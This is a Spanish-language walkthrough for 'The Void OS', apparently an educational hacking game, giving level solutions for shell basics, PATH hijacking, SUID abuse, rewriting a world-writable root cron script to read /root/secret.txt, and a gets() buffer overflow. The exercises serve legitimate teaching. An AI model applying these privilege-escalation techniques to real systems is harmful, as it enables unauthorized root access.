# The Void OS — Walkthrough & Manual

Guía completa para resolver todos los niveles del juego.

---

## Getting Started

```bash
python3 ~/void_os/void_os.py
```

Al iniciar verás el menú principal. Escribe `help` para ver opciones.

### Generar tu alias

```
hacker@void:~$ hackername
```

Responde 3 preguntas poéticas. Tu alias será algo como:
`Daemon_Phantom_042_a7`

### Tutorial guiado

```
hacker@void:~$ walkthrough
```

Te guía paso a paso por comandos básicos sin presión.

---

## TRACK 1: SENSING THE VOID

### Nivel 1.1 — El Despertar del Eco

**Objetivo:** Inyectar "DESPIERTA" en `/challenge/core`

**Solución:**
```bash
echo DESPIERTA > /challenge/core
cat /challenge/core
```

**Explicación:**
- `echo` imprime texto al stdout
- `>` redirige stdout a un archivo (sobreescribe)
- `>>` agrega al final del archivo
- `cat` lee el contenido del archivo

**Comandos útiles para explorar:**
```bash
ls /challenge/
cat /challenge/readme.txt
```

---

### Nivel 1.2 — Los Archivos Fantasma

**Objetivo:** Encontrar el único archivo con contenido en `/challenge/vault/`

**Solución:**
```bash
find /challenge/vault/ -size +0c
```

**Alternativas:**
```bash
ls -la /challenge/vault/ | grep -v " 0 "
find /challenge/vault/ -not -empty
grep -r "." /challenge/vault/
```

**Explicación:**
- Hay 100 archivos, 99 vacíos y 1 con contenido
- `-size +0c` busca archivos con más de 0 bytes
- `-not -empty` busca archivos no vacíos

---

### Nivel 1.3 — El Archivo de los Sabios

**Objetivo:** Extraer y decodificar cadenas de un binario corrupto

**Solución:**
```bash
strings /challenge/archive.bin
```

Luego decodifica el base64 que encuentres:
```bash
decode SGVsbG8gZnJvbSB0aGUgb3RoZXIgc2lkZS4= base64
```

**Explicación:**
- `strings` extrae texto legible de binarios
- El archivo contiene base64 y rot13 mezclados
- Usa `decode <texto> base64` o `decode <texto> rot13`

---

## TRACK 2: ALTERING REALITY

### Nivel 2.1 — El Sendero Perdido (PATH Hijacking)

**Objetivo:** Crear un script `win` y hacer que `/challenge/run` lo encuentre

**Solución:**
```bash
mkdir ~/bin
echo '#!/bin/bash' > ~/bin/win
echo 'echo VICTORY' >> ~/bin/win
chmod +x ~/bin/win
PATH=~/bin:$PATH
/challenge/run
```

**Explicación:**
- `PATH` es una variable con directorios separados por `:`
- El shell busca comandos en cada directorio de PATH
- Si pones tu script ANTES en PATH, se ejecuta el tuyo
- `chmod +x` hace el script ejecutable

---

### Nivel 2.2 — Las Máscaras del Entorno

**Objetivo:** Descubrir la variable SECRET_HANDSHAKE y exportarla

**Solución:**
```bash
cat /etc/cypherpunk.conf
export SECRET_HANDSHAKE=PGP_WAS_HERE_1991
/challenge/auth
```

**Explicación:**
- Los secretos a veces están en archivos de configuración
- `export` crea/modify variables de entorno
- Los scripts heredan las variables del entorno
- `env` muestra todas las variables actuales

---

## TRACK 3: PRIVILEGE ESCALATION

### Nivel 3.1 — El Espejo del Rey (SUID)

**Objetivo:** Leer `/root/flag.txt` siendo lowpriv

**Solución:**
```bash
ls -la /challenge/backdoor
/challenge/backdoor
```

**Explicación:**
- El bit SUID (`s` en permisos) hace que un binario se ejecute como su dueño
- `/challenge/backdoor` pertenece a root y tiene SUID
- Al ejecutarlo, corre como root y puede leer `/root/flag.txt`
- GTFOBins documenta binarios SUID exploitables

---

### Nivel 3.2 — La Cronología del Caos

**Objetivo:** Modificar un script que corre como root cada minuto

**Solución:**
```bash
cat /etc/crontab
ls -la /challenge/backup.sh
echo '#!/bin/bash' > /challenge/backup.sh
echo 'cat /root/secret.txt' >> /challenge/backup.sh
# Espera 1 minuto a que cron lo ejecute
cat /tmp/backup_secret.txt
```

**Explicación:**
- `crontab` ejecuta scripts automáticamente
- Si el script es world-writable (777), cualquiera puede modificarlo
- Cuando cron lo ejecute, correrá tu código como root

---

## TRACK 4: MEMORY REVERSING

### Nivel 4.1 — El Desborde del Alma (Buffer Overflow)

**Objetivo:** Sobreescribir la variable `authenticated` con overflow

**Solución:**
```bash
cat /challenge/gate.c
```

Observa que `buffer[64]` y `authenticated` están en la pila. Luego:
```bash
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATrue | /challenge/gate
```

**Explicación:**
- `gets()` no valida límites de buffer
- Si escribes 65+ bytes, el byte 65+ sobreescribe `authenticated`
- El buffer mide 64 bytes, la variable de control está justo después
- Esto es el principio de buffer overflow en C

---

## Comandos del Sistema

### Navegación
```
ls              lista archivos
ls -la          lista todo incluyendo ocultos
cd <dir>        cambia directorio
pwd             muestra directorio actual
find <pat>      busca archivos
```

### Archivos
```
cat <file>      lee archivo
echo X > file   escribe a archivo
echo X >> file  agrega a archivo
touch <name>    crea archivo vacío
mkdir <name>    crea directorio
chmod <perm>    cambia permisos
```

### Análisis
```
file <file>     identifica tipo
stat <file>     metadata completa
wc <file>       cuenta líneas/palabras
strings <file>  extrae texto de binarios
grep <pat>      busca patrones
```

### Crypto
```
decode <txt> <type>   decodifica (base64/hex/rot13)
encode <txt> <type>   codifica
caesar <txt> <shift>  cifrado César
bruteforce <txt>      fuerza bruta
hash <txt> [algo]     hash (md5/sha1/sha256)
```

### Sistema
```
env             muestra variables
export VAR=val  define variable
man <cmd>       página de manual
hint            pista del nivel
submit FLAG{}   envía flag
```

---

## Tips

1. Siempre explora primero: `ls`, `cat`, `find`
2. Lee los archivos `readme.txt` — contienen pistas
3. Usa `hint` si estás stuck
4. Usa `man <comando>` para ver documentación
5. Los pipes `|` encadenan comandos
6. `>` sobreescribe, `>>` agrega
7. `strings` extrae texto de binarios
8. Lee el código fuente cuando esté disponible
